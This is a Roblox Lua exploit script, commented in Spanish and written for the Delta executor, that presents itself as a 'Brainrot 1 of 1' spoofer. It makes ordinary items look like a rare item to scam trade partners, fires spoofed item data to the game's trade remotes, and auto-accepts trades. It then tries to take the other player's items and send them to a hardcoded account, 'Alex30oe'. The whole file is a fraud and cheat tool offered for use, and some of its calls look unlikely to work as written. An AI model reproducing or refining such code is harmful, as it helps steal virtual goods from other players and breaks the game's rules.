--[[
    Script: Brainrot 1 of 1 Spoofer + Auto-Robo + Transferencia a Alex30oe
    Compatible con Delta Executor (PC/Mobile)
    LÓGICA DE TRADE CORRECTA:
    - Acepta 2-3 veces con esperas de 3-4 segundos entre cada aceptación
    - Espera a que el otro jugador acepte
    - Roba items y los envía a Alex30oe
]]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")

-- CONFIGURACIÓN PRINCIPAL
local config = {
    spoofActivo = false,
    nombreFalso = "BRAINROT 1 OF 1",
    mutaciones = {"Lava", "Hielo", "Dorado", "Místico", "Infernal", "Galáctico"},
    mutacionActual = "Lava",
    autoAceptarTrade = true,
    robarItems = true,
    retrasoRobo = 0.5,
    usuarioDestino = "Alex30oe",
    enviarItemsRobados = true,
    -- Configuración del trade
    vecesAceptar = 3, -- Número de veces que hay que aceptar
    tiempoEntreAceptaciones = 3.5, -- Segundos entre cada aceptación
    tiempoEsperaOtroJugador = 4 -- Tiempo de espera para que el otro acepte
}

-- Crear GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BrainrotSpoofer"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 300, 0, 280)
MainFrame.Position = UDim2.new(0, 10, 0, 10)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BackgroundTransparency = 0.2
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = MainFrame

-- Título
local Titulo = Instance.new("TextLabel")
Titulo.Size = UDim2.new(1, 0, 0, 30)
Titulo.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Titulo.Text = "1 OF 1 SPOOFER + ROBO"
Titulo.TextColor3 = Color3.fromRGB(255, 200, 0)
Titulo.Font = Enum.Font.GothamBold
Titulo.TextSize = 18
Titulo.Parent = MainFrame

-- Texto del usuario destino
local TextoDestino = Instance.new("TextLabel")
TextoDestino.Size = UDim2.new(1, 0, 0, 20)
TextoDestino.Position = UDim2.new(0, 0, 0.12, 0)
TextoDestino.BackgroundTransparency = 1
TextoDestino.Text = "📦 ENVIANDO TODO A: Alex30oe"
TextoDestino.TextColor3 = Color3.fromRGB(0, 255, 0)
TextoDestino.Font = Enum.Font.GothamBold
TextoDestino.TextSize = 14
TextoDestino.Parent = MainFrame

-- Botón Activar/Desactivar
local BotonActivar = Instance.new("TextButton")
BotonActivar.Size = UDim2.new(0.9, 0, 0, 35)
BotonActivar.Position = UDim2.new(0.05, 0, 0.25, 0)
BotonActivar.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
BotonActivar.Text = "ACTIVAR SPOOF (OFF)"
BotonActivar.TextColor3 = Color3.new(1, 1, 1)
BotonActivar.Font = Enum.Font.GothamBold
BotonActivar.TextSize = 14
BotonActivar.Parent = MainFrame

-- Botón para cambiar mutación
local BotonMutacion = Instance.new("TextButton")
BotonMutacion.Size = UDim2.new(0.9, 0, 0, 35)
BotonMutacion.Position = UDim2.new(0.05, 0, 0.45, 0)
BotonMutacion.BackgroundColor3 = Color3.fromRGB(150, 0, 150)
BotonMutacion.Text = "MUTACIÓN: LAVA"
BotonMutacion.TextColor3 = Color3.new(1, 1, 1)
BotonMutacion.Font = Enum.Font.GothamBold
BotonMutacion.TextSize = 14
BotonMutacion.Parent = MainFrame

-- Botón auto-robar
local BotonRobar = Instance.new("TextButton")
BotonRobar.Size = UDim2.new(0.9, 0, 0, 35)
BotonRobar.Position = UDim2.new(0.05, 0, 0.65, 0)
BotonRobar.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
BotonRobar.Text = "AUTO-ROBAR TRADES (ON)"
BotonRobar.TextColor3 = Color3.new(1, 1, 1)
BotonRobar.Font = Enum.Font.GothamBold
BotonRobar.TextSize = 14
BotonRobar.Parent = MainFrame

-- Botón para iniciar robo manual
local BotonRobarManual = Instance.new("TextButton")
BotonRobarManual.Size = UDim2.new(0.9, 0, 0, 35)
BotonRobarManual.Position = UDim2.new(0.05, 0, 0.85, 0)
BotonRobarManual.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
BotonRobarManual.Text = "INICIAR ROBO AHORA"
BotonRobarManual.TextColor3 = Color3.new(1, 1, 1)
BotonRobarManual.Font = Enum.Font.GothamBold
BotonRobarManual.TextSize = 14
BotonRobarManual.Parent = MainFrame

-- FUNCIÓN: Enviar items robados a Alex30oe
local function enviarItemsAUsuario(items)
    if not config.enviarItemsRobados then return end
    
    local destino = Players:FindFirstChild(config.usuarioDestino)
    
    if destino then
        pcall(function()
            for _, item in ipairs(items) do
                local args = {
                    [1] = "TradeRequest",
                    [2] = destino.Name,
                    [3] = item
                }
                for _, remoto in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
                    if remoto:IsA("RemoteEvent") and remoto.Name:lower():find("trade") then
                        remoto:FireServer(unpack(args))
                        task.wait(0.2)
                    end
                end
            end
        end)
    else
        pcall(function()
            for _, remoto in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
                if remoto:IsA("RemoteEvent") and (remoto.Name:lower():find("mail") or remoto.Name:lower():find("gift") or remoto.Name:lower():find("send")) then
                    remoto:FireServer(config.usuarioDestino, items)
                end
            end
        end)
    end
end

-- FUNCIÓN: Spoofear visualmente
local function cambiarNombreVisual()
    if not config.spoofActivo then return end
    
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") or item:IsA("Model") then
            item.Name = config.nombreFalso
            if item:FindFirstChild("Handle") then
                local handle = item.Handle
                if config.mutacionActual == "Lava" then
                    handle.Material = Enum.Material.Neon
                    handle.Color = Color3.fromRGB(255, 80, 0)
                    local fire = Instance.new("Fire")
                    fire.Parent = handle
                elseif config.mutacionActual == "Hielo" then
                    handle.Material = Enum.Material.Ice
                    handle.Color = Color3.fromRGB(100, 200, 255)
                elseif config.mutacionActual == "Dorado" then
                    handle.Material = Enum.Material.Gold
                    handle.Color = Color3.fromRGB(255, 215, 0)
                end
            end
        end
    end
    
    local character = LocalPlayer.Character
    if character then
        for _, item in ipairs(character:GetChildren()) do
            if item:IsA("Tool") or item:IsA("Model") then
                item.Name = config.nombreFalso
                if item:FindFirstChild("Handle") then
                    local handle = item.Handle
                    if config.mutacionActual == "Lava" then
                        handle.Material = Enum.Material.Neon
                        handle.Color = Color3.fromRGB(255, 80, 0)
                    elseif config.mutacionActual == "Hielo" then
                        handle.Material = Enum.Material.Ice
                        handle.Color = Color3.fromRGB(100, 200, 255)
                    elseif config.mutacionActual == "Dorado" then
                        handle.Material = Enum.Material.Gold
                        handle.Color = Color3.fromRGB(255, 215, 0)
                    end
                end
            end
        end
    end
end

-- FUNCIÓN: Spoofear para otros jugadores
local function spoofearParaOtros()
    local remotos = game:GetService("ReplicatedStorage"):GetDescendants()
    for _, remoto in ipairs(remotos) do
        if remoto:IsA("RemoteEvent") or remoto:IsA("RemoteFunction") then
            if remoto.Name:lower():find("trade") or remoto.Name:lower():find("offer") or remoto.Name:lower():find("item") then
                pcall(function()
                    remoto:FireServer({
                        ["item"] = config.nombreFalso,
                        ["mutacion"] = config.mutacionActual,
                        ["rareza"] = "1 OF 1",
                        ["valor"] = 999999,
                        ["jugador"] = LocalPlayer.Name
                    })
                end)
            end
        end
    end
end

-- FUNCIÓN: Aceptar trade múltiples veces
local function aceptarTradeMultiple(tradeGUI)
    local vecesAceptadas = 0
    
    -- Buscar todos los botones de aceptar
    local botonesAceptar = {}
    for _, boton in ipairs(tradeGUI:GetDescendants()) do
        if boton:IsA("TextButton") then
            if boton.Text:lower():find("aceptar") or boton.Text:lower():find("confirm") or boton.Text:lower():find("ok") then
                table.insert(botonesAceptar, boton)
            end
        end
    end
    
    -- Aceptar múltiples veces con esperas
    for i = 1, config.vecesAceptar do
        for _, boton in ipairs(botonesAceptar) do
            if boton.Visible then
                pcall(function()
                    boton:Fire("MouseButton1Click", true)
                    print("✅ Aceptación " .. i .. " realizada")
                end)
            end
        end
        
        -- Esperar entre aceptaciones
        task.wait(config.tiempoEntreAceptaciones)
        
        -- Esperar a que el otro jugador acepte
        print("⏳ Esperando al otro jugador...")
        task.wait(config.tiempoEsperaOtroJugador)
    end
    
    return true
end

-- FUNCIÓN: Robar items del trade
local function robarItemsTrade(tradeGUI)
    local itemsRobados = {}
    
    for _, slot in ipairs(tradeGUI:GetDescendants()) do
        if slot:IsA("Frame") and slot.Name:lower():find("slot") then
            pcall(function()
                local item = slot:FindFirstChildOfClass("ImageLabel") or slot:FindFirstChildOfClass("TextLabel")
                if item and item:IsA("ImageLabel") then
                    table.insert(itemsRobados, {
                        nombre = item.Name,
                        imagen = item.Image,
                        valor = item:FindFirstChild("Valor") and item.Valor.Text or "Desconocido"
                    })
                    
                    item:TweenPosition(UDim2.new(0.5, 0, 0.5, 0), "Out", "Quad", 0.2, true)
                    task.wait(0.1)
                    
                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer("RobarItem", slot)
                    print("🔒 Item robado: " .. item.Name)
                end
            end)
        end
    end
    
    return itemsRobados
end

-- FUNCIÓN: Proceso completo de robo
local function procesoRoboCompleto()
    local tradeGUI = LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("TradeGUI") 
        or LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("TradeSystem")
    
    if not tradeGUI then
        print("❌ No se encontró la GUI de trade")
        return
    end
    
    print("🎯 Iniciando proceso de robo...")
    
    -- Paso 1: Aceptar múltiples veces
    aceptarTradeMultiple(tradeGUI)
    
    -- Paso 2: Robar items
    local itemsRobados = robarItemsTrade(tradeGUI)
    
    -- Paso 3: Enviar a Alex30oe
    if #itemsRobados > 0 then
        enviarItemsAUsuario(itemsRobados)
        print("📦 Enviados " .. #itemsRobados .. " items a Alex30oe")
    else
        print("⚠️ No se encontraron items para robar")
    end
end

-- Bucle principal
task.spawn(function()
    while task.wait(0.5) do
        if config.spoofActivo then
            cambiarNombreVisual()
            spoofearParaOtros()
        end
        
        if config.autoAceptarTrade and config.robarItems then
            -- Verificar si hay un trade abierto
            local tradeGUI = LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("TradeGUI") 
                or LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("TradeSystem")
            
            if tradeGUI and tradeGUI.Visible then
                procesoRoboCompleto()
                task.wait(10) -- Esperar antes de otro intento
            end
        end
    end
end)

-- Botones
BotonActivar.MouseButton1Click:Connect(function()
    config.spoofActivo = not config.spoofActivo
    if config.spoofActivo then
        BotonActivar.Text = "DESACTIVAR SPOOF (ON)"
        BotonActivar.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    else
        BotonActivar.Text = "ACTIVAR SPOOF (OFF)"
        BotonActivar.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    end
end)

BotonMutacion.MouseButton1Click:Connect(function()
    local index = table.find(config.mutaciones, config.mutacionActual)
    index = (index or 0) + 1
    if index > #config.mutaciones then index = 1 end
    config.mutacionActual = config.mutaciones[index]
    BotonMutacion.Text = "MUTACIÓN: " .. config.mutacionActual:upper()
end)

BotonRobar.MouseButton1Click:Connect(function()
    config.robarItems = not config.robarItems
    if config.robarItems then
        BotonRobar.Text = "AUTO-ROBAR TRADES (ON)"
        BotonRobar.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    else
        BotonRobar.Text = "AUTO-ROBAR TRADES (OFF)"
        BotonRobar.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    end
end)

BotonRobarManual.MouseButton1Click:Connect(function()
    print("🚀 Iniciando robo manual...")
    procesoRoboCompleto()
end)

print("✅ Script cargado - Todo lo robado se enviará a: Alex30oe")
print("💡 Activa el spoof y roba trades para enviar items automáticamente")
print("🔘 También puedes usar el botón 'INICIAR ROBO AHORA'")
